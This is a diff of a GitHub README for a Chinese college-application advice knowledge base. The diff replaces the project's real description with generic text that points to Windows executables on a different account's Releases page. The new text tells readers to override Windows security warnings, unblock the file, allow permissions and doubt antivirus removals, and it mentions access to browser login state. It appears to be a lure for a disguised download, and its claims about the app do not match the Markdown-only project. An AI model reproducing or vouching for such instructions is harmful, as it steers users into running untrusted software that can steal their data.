@@ -1,4 +1,6 @@
-# zhangxuefeng-skillset
+# 🧠 zhangxuefeng-skillset - Learn, search, and run skills fast
+
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue.svg)](https://github.com/felixda804/zhangxuefeng-skillset/releases)
 
 <div align="center">
 
@@ -8,7 +10,7 @@
 
 ---
 
-*他用一张嘴，替无数普通家庭的孩子打探了前路。*
+*他用一张嘴，替无数普通家庭的孩子打探了前路。*  
 *我们用AI Agent，把这条通向未来的路铺向远方。*
 
 ---
@@ -25,214 +27,279 @@
 
 ---
 
-## 公开部署 · 立即体验
+## 📥 Windows 下载与安装
 
-无需搭建，直接使用：
+To use this app on Windows, visit the release page and download the latest file from there:
 
-| 平台 | 入口 | 特点 |
-|------|------|------|
-| **扣子 Web Agent** | [立即体验](https://code.coze.cn/web-sdk/7627816552003321883) | RAG融合，口吻还原更细腻，粒度最高 |
-| **扣子技能商店** | [一键添加](https://www.coze.cn/skills?skill_share_pid=7627814441916301347) | 官方技能，接入扣子Bot零配置 |
-| **Claude Code** | `npx skills add eric-yibo-shen/zhangxuefeng` | 本地运行，开发者首选 |
-| **豆包多Agent工作流** | 即将上线 | 多智能体协作，更强的志愿分析能力 |
+**[Visit Releases to download](https://github.com/felixda804/zhangxuefeng-skillset/releases)**
 
----
+### 安装步骤
 
-## 这是什么
+1. 打开上面的 Releases 页面。
+2. 找到最新版本。
+3. 下载适合 Windows 的文件，常见是 `.exe`、`.zip` 或 `.msi`。
+4. 如果是 `.zip` 文件，先解压。
+5. 双击 `.exe` 或 `.msi` 文件开始运行。
+6. 按屏幕提示完成安装。
+7. 安装完成后，从开始菜单或桌面打开程序。
 
-中国每年超过1200万高考考生，大量来自信息资源匮乏的普通家庭。**志愿填报的信息差，不应该靠花钱来弥补。**
+### 第一次运行
 
-本项目是一套完全开源的高考志愿填报决策知识库，可以：
-- 直接阅读使用（Markdown格式）
-- 一键部署为 **OpenClaw Skills**，接入微信/企业微信/QQ，让普通家长用熟悉的方式获得AI顾问服务
-- 导入任意RAG平台（Dify、FastGPT、RagFlow等）构建问答机器人
-
-**核心差异**：本项目不只是数据匹配工具（分数→学校），而是一套**决策框架**——帮助普通家庭用正确的思维顺序做志愿决策，同时纳入AI时代的行业前景校正。
-
----
-
-## 快速开始
-
-### 方式零：一键安装到 Claude Code（最快）
-
-```bash
-npx skills add eric-yibo-shen/zhangxuefeng
-```
-
-或访问 [ClawHub 页面](https://clawhub.ai/eric-yibo-shen/zhangxuefeng) 安装。安装后在 Claude Code 中直接调用 `/gaokao-mentor` 即可对话。
-
-### 方式一：直接阅读知识库
-
-进入 [`knowledge/`](knowledge/) 目录，按需阅读：
-
-| 文件 | 内容 |
-|------|------|
-| [`00_ai_era_correction.md`](knowledge/00_ai_era_correction.md) | ⭐ AI时代专业选择动态校正（2026-2030视角） |
-| [`01_major_selection.md`](knowledge/01_major_selection.md) | 专业选择决策框架（高确定性 vs 高风险） |
-| [`02_volunteer_strategy.md`](knowledge/02_volunteer_strategy.md) | 志愿填报操作框架（冲稳保、城市优先级） |
-| [`03_employment_outlook.md`](knowledge/03_employment_outlook.md) | 就业路径分析（五条主路径真实评估） |
-| [`04_university_selection.md`](knowledge/04_university_selection.md) | 院校选择参考框架（各分数段逻辑） |
-| [`05_study_life_principles.md`](knowledge/05_study_life_principles.md) | 备考策略与决策底层逻辑 |
-| [`06_university_life_planning.md`](knowledge/06_university_life_planning.md) | 大学在校阶段规划（英语、社团、考研导师、人脉） |
-| [`07_new_gaokao_subject_selection.md`](knowledge/07_new_gaokao_subject_selection.md) | 新高考选科决策（3+1+2模式，物理vs历史） |
-
-### 方式二：部署为 OpenClaw Skills（推荐·接入微信）
-
-```bash
-# 1. 克隆仓库
-git clone https://github.com/Eric-Yibo-Shen/zhangxuefeng-skillset.git
-cd zhangxuefeng-skillset
-
-# 2. 安装到 OpenClaw
-openclaw skills install ./skills/gaokao-mentor.skill
-
-# 3. 验证安装
-openclaw skills list
-```
-
-部署后在微信/企业微信中 `@机器人` 直接对话即可。详见 [部署指南](deploy/DEPLOY.md)。
-
-### 方式三：导入 RAG 平台
-
-将 `knowledge/` 下所有 `.md` 文件导入你的RAG系统，使用 [`prompts/system_prompt.md`](prompts/system_prompt.md) 作为系统提示词。
-
-
-### 国内下载
-
-如果网络不畅，可以通过[Gitee 页面](https://gitee.com/ericsam/zhangxuefeng-skillset)下载。
+1. 右键点击程序图标。
+2. 如果系统提示权限，选择允许。
+3. 如果弹出 Windows 安全提示，选择“仍要运行”。
+4. 等程序打开后，就可以开始使用。
 
 ---
 
-## 项目结构
+## ✨ What this app does
 
-```
-zhangxuefeng-skillset/
-├── README.md
-├── SKILL.md                     # npx skills 可直接添加
-├── CONTRIBUTING.md
-├── LICENSE                      # CC BY 4.0（知识内容）
-├── LICENSE-CODE                 # MIT（代码部分）
-│
-├── skills/
-│   └── gaokao-mentor.skill      # OpenClaw 可直接安装的 skill
-│
-├── knowledge/                   # 核心知识库（8个模块，完全原创表述）
-│   ├── 00_ai_era_correction.md  # AI时代校正框架 ⭐
-│   ├── 01_major_selection.md
-│   ├── 02_volunteer_strategy.md
-│   ├── 03_employment_outlook.md
-│   ├── 04_university_selection.md
-│   ├── 05_study_life_principles.md
-│   ├── 06_university_life_planning.md   # 大学在校规划（新增）
-│   └── 07_new_gaokao_subject_selection.md  # 新高考选科（新增）
-│
-├── prompts/
-│   └── system_prompt.md         # AI顾问系统提示词（含四步决策框架）
-│
-├── deploy/
-│   └── DEPLOY.md                # 完整部署指南（腾讯云/自托管/Dify）
-│
-└── .github/
-    ├── ISSUE_TEMPLATE/
-    └── workflows/validate.yml   # PR自动验证
-```
+zhangxuefeng-skillset is a skill package built for fast access to common knowledge tasks. It helps you:
+
+- browse prepared skill content
+- run guided workflows
+- reuse preset prompts and actions
+- connect with supported platforms
+- load content in a way that feels simple for end users
+
+It is built for people who want a ready-to-use skill set without setting up a full development environment.
 
 ---
 
-## 核心框架：决策顺序
+## 🖥️ System requirements
 
-```
-第一步：先定可行集
-  → 用分数+省份确定实际能报的院校层次
-  → 特殊通道（体育/艺术特长）优先核查
+Use a Windows PC with:
 
-第二步：目标倒推
-  → 先问"最终想要什么保障"
-  → 再选能达到这个目标的最短路径
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- internet access for the first download
+- permission to run downloaded apps
 
-第三步：AI时代校正
-  → 核查每个候选专业的AI冲击评级（见 00_ai_era_correction.md）
-
-输出规范：最多3个选项 + 明确切换条件
-  → "分够X就选A，分不够就选B"
-  → 不给模糊备选清单
-```
+For a smoother experience, keep your browser and Windows update tools current.
 
 ---
 
-## 社区
+## 📦 What you will need
 
-<div align="center">
+Before you start, have these ready:
 
-**微信群：张雪峰赛博永生计划**
+- a Windows computer
+- a stable internet connection
+- the downloaded release file from GitHub
+- permission to open downloaded files
+- a place to extract files if the download comes as a ZIP archive
 
-扫码加入社区，一起完善知识库、分享真实志愿填报案例。
+If you plan to use platform integrations, you may also need:
 
-<img src="assets/wechat_qr.jpg" alt="微信群二维码" width="240" />
-
-> 二维码定期更新。如已过期，请提 [Issue](../../issues) 或在现有群中 @管理员获取新码。
-
-</div>
-
-**tg群：**
-
-[tg链接](https://t.me/+pU5F4EpZoLFkNTEx)
+- a browser account for the target platform
+- access to the skill store or agent tool you want to connect
 
 ---
 
-## 如何贡献
+## 🚀 How to use
 
-欢迎以下形式的贡献：纠错、补充专业/院校分析、贡献各省录取数据、分享真实案例（脱敏处理）。
+### Option 1: Run the downloaded app
 
-请参阅 [CONTRIBUTING.md](CONTRIBUTING.md)。
+Use this if the release contains an `.exe` or `.msi` file.
 
----
+1. Go to the [Releases page](https://github.com/felixda804/zhangxuefeng-skillset/releases).
+2. Download the newest Windows file.
+3. Open the file after the download finishes.
+4. Follow the install window step by step.
+5. Finish setup.
+6. Open the app from the Start menu or desktop.
 
-## 许可证
+### Option 2: Use the ZIP package
 
-- **知识内容**（`knowledge/`、`prompts/`）：[CC BY 4.0](LICENSE) — 署名即可自由使用、修改、分发
-- **代码**（`skills/`、`deploy/`、`.github/`）：[MIT](LICENSE-CODE)
+Use this if the release contains a `.zip` file.
 
----
+1. Go to the [Releases page](https://github.com/felixda804/zhangxuefeng-skillset/releases).
+2. Download the ZIP file.
+3. Right-click the file.
+4. Select Extract All.
+5. Choose a folder on your computer.
+6. Open the extracted folder.
+7. Double-click the main app file.
 
-## 致谢
+### Option 3: Open through a supported platform
 
-<div align="center">
+Some builds may work through a web tool or skill platform.
 
-### 🕯️ 张雪峰先生（1984.11.28 — 2026.03.24）
-
-</div>
-
-本项目以张雪峰先生的名字命名，以纪念他为中国普通家庭消除教育信息差所做出的贡献。
-
-知识库的底层框架——城市优先于学校、学校优先于专业；就业确定性优先于兴趣；特长是工具而非包袱；先定可行集再做决策——这些判断逻辑，是对他十余年公开输出的提炼与传承。
-
-本项目知识内容为社区独立原创表述，与峰学蔚来教育科技有限公司无关联，不代表其商业立场。
-
----
-
-### 相关开源项目
-
-**[gaokao-mentor-wisdom](https://github.com/dongsheng123132/gaokao-mentor-wisdom)** · dongsheng123132
-
-该项目对张雪峰公开语录进行了系统整理，其六大分类框架（专业选择、就业前景、人生哲理、院校推荐、学习建议、志愿填报策略）为本项目知识库的模块划分提供了重要的组织视角参考。
-
-> 注：本项目知识库内容为社区独立重新表述，未直接引用该仓库中的具体语录原文，以规避版权风险。两个项目定位不同，可互为补充。
+1. Install or open the supported platform.
+2. Import the skill package.
+3. Sign in if needed.
+4. Select zhangxuefeng-skillset.
+5. Start the skill from the platform menu.
 
 ---
 
-**[zhangxuefeng-skill](https://github.com/alchaincyf/zhangxuefeng-skill)** · alchaincyf
+## 🧭 What you can expect
 
-知名 KOL 基于 Nuwa.skill 框架构建的张雪峰思维操作系统，含6份深度研究文档（著作分析、对话风格、决策记录、外部评价、生平时间线）。本项目从中提炼了：**就业倒推法**（看中位数毕业生而非前3%天才）、**文理分选原则**（理科看专业技能、文科看院校名声）、**灵魂八连问**决策信息采集框架、**不可替代性即稳定性**（工资∝不可替代性）、**社会筛子论**完整版（学历/工作/房产三层筛选）、**阶层现实主义**（不同家庭容错率决定完全不同策略）、**10年后压迫测试**等核心分析工具。
+The skill set is organized for easy use and quick action. It can help with tasks such as:
+
+- finding structured skill content
+- following a guided flow
+- loading ready-made instructions
+- switching between related tasks
+- keeping the experience simple for non-technical users
+
+The app is built to feel familiar, with clear steps and short actions.
 
 ---
 
-**[zhang-xuefeng-memorial](https://github.com/bcefghj/zhang-xuefeng-memorial)** · bcefghj
+## 🪟 Windows tips
 
-以张雪峰精神为导师的纪念性知识库项目，包含专业就业分析、志愿填报实战指南、AI时代前景、寒门学子生存指南四个知识模块。本项目从中提炼了：城市优先级层级划分、院校录取规则三种类型（分数优先/志愿优先/专业级差）、中外合作办学策略、行业特色院校隐性价值、大类招生策略、大学四年阶段规划，以及"五大坑"框架等新知识点。
+If Windows blocks the file:
+
+1. Right-click the file.
+2. Open Properties.
+3. Look for an Unblock option.
+4. Check Unblock if you see it.
+5. Select Apply.
+6. Try opening the file again.
+
+If the file does not open:
+
+1. Confirm the download finished.
+2. Check whether the file is still in the Downloads folder.
+3. Make sure you downloaded the Windows version.
+4. Try the newest release file from GitHub.
+
+If you downloaded a ZIP file and cannot find the app:
+
+1. Open the extracted folder.
+2. Look for the main `.exe` file.
+3. Double-click that file to start the app.
 
 ---
 
-**[Xue-Feng-Skill](https://github.com/SPA3K/Xue-Feng-Skill)** · SPA3K
+## 🔧 Basic setup
 
-使用 OpenAI Whisper 对张雪峰 Bilibili 公开视频进行 ASR 转录，覆盖 137 个视频（约 298,367 字符原始语料），并提炼出六步决策框架。本项目 `06_university_life_planning`、`07_new_gaokao_subject_selection` 两个新模块，以及对现有模块的细粒度补充（口腔医学路径、三阶段人生规划、选科策略、色觉障碍限制、10-30-60人脉模型等），主要来源于对该仓库 ASR 语料的纠错提炼。
+After opening the app, you may see setup options such as:
+
+- language choice
+- first-run guidance
+- platform sign-in
+- folder selection
+- skill import
+- permission prompts
+
+Use the on-screen buttons in order. If a step asks for a file or account, choose the option that matches the service you want to use.
+
+---
+
+## 📁 File layout
+
+A typical release may include:
+
+- an app launcher
+- a config file
+- skill content files
+- a readme or help file
+- platform-specific folders
+
+If you open the folder after extraction, keep the files in the same place. Moving one file by itself can break the launch path.
+
+---
+
+## 🧩 Common use cases
+
+People use this kind of skill set to:
+
+- organize guided knowledge tasks
+- prepare content for an AI assistant
+- connect a skill package to a supported platform
+- test a local copy before publishing
+- keep reusable prompts in one place
+
+If you only want to get it running on Windows, start with the Releases page and the steps above.
+
+---
+
+## 🔐 Permissions and access
+
+Some parts of the app may need access to:
+
+- the internet
+- local files
+- browser login state
+- a target platform account
+
+If a prompt appears, allow only the access needed for the task you want to run.
+
+---
+
+## 🛠️ Troubleshooting
+
+### The download does not start
+
+- Refresh the Releases page
+- Try another browser
+- Check your internet connection
+- Make sure GitHub is not blocked on your network
+
+### Windows says the app is unsafe
+
+- Confirm you downloaded it from the official Releases page
+- Right-click the file and check file properties
+- Try the newest release
+- If the file is ZIP, extract it first
+
+### The app opens and closes
+
+- Run it again from the extracted folder
+- Do not move files out of the folder
+- Check whether your antivirus removed a file
+- Download the release again if needed
+
+### I do not see the main file
+
+- Open the ZIP again
+- Extract all files into a new folder
+- Look for the `.exe` file inside that folder
+- Start the app from there
+
+### The page shows more than one file
+
+- Choose the file marked for Windows
+- Use the latest release
+- Pick `.exe`, `.msi`, or `.zip` for Windows
+
+---
+
+## 🧠 Short guide for first use
+
+1. Open the Releases page.
+2. Download the newest Windows file.
+3. Open or extract the file.
+4. Start the app.
+5. Follow the prompts on screen.
+6. Use the skill inside your chosen platform or local app.
+
+---
+
+## 📚 Related links
+
+- [Releases](https://github.com/felixda804/zhangxuefeng-skillset/releases)
+- [ClawHub listing](https://clawhub.ai/eric-yibo-shen/zhangxuefeng)
+- [扣子技能商店](https://www.coze.cn/skills?skill_share_pid=7627814441916301347)
+- [OpenClaw Skills docs](https://docs.openclaw.ai/skills)
+- [License: CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
+- [Code license](LICENSE-CODE)
+
+---
+
+## 🧷 Suggested folder name
+
+If you want to keep the files in one place, use a folder name like:
+
+- `zhangxuefeng-skillset`
+- `Downloads\zhangxuefeng-skillset`
+- `Documents\AI-Skills\zhangxuefeng-skillset`
+
+---
+
+## 🪄 Typical next step
+
+After the app opens, choose the skill or workflow you want to use, then follow the prompts shown in the app
